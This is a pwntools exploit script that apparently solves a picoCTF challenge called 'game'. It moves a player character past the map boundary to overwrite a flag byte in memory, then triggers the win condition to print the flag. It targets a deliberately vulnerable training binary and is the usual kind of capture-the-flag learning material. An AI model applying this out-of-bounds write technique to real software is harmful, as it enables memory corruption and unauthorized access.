#!/usr/bin/env python3

from pwn import *

exe = ELF("./game")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 63806)

    return r


def main():
    r = conn()

    # Newline is \n
    if args.LOCAL: 
        # Initial player position: (4,4) => (row,col)
        for i in range(4): 
            r.sendlineafter(b'X\n', b'w')
   
            # Map is printed twice
            print(r.recvuntil(b'flag:'))
            print(r.recvuntil(b'flag:'))
    
        # Current player position: (0,4)

        for i in range(8):
            r.sendlineafter(b'X\n', b'a')

            # Map is printed twice
            print(r.recvuntil(b'flag:'))
            print(r.recvuntil(b'flag:'))
        
        # Current player position: (0,-4)

        # Should print 64, signifying that the flag byte has been overwritten
        print(r.recvuntil(b'X\n')[:2])

        # Solves the challenge so that the flag can be printed
        r.sendline(b'p')
        
        # Print flag
        r.recvuntil(b'flage\n')
        print(r.recvline())
    
    # Newline is \r\n
    else: 
        # Initial player position: (4,4) => (row,col)
        for i in range(4): 
            r.sendlineafter(b'X\r\n', b'w')
   
            # Map is printed twice
            print(r.recvuntil(b'flag:'))
            print(r.recvuntil(b'flag:'))
    
        
        # Current player position: (0,4)

        for i in range(8):
            r.sendlineafter(b'X\r\n', b'a')

            # Map is printed twice
            print(r.recvuntil(b'flag:'))
            print(r.recvuntil(b'flag:'))
        
        
        # Current player position: (0,-4)

        # Should print 64, signifying that the flag byte has been overwritten
        print(r.recvuntil(b'X\r\n')[:2])

        # Solves the challenge so that the flag can be printed
        r.sendline(b'p')
        
        # Print flag
        r.recvuntil(b'flage\r\n')
        print(r.recvuntil(b'}')) # No \r\n after flag


if __name__ == "__main__":
    main()
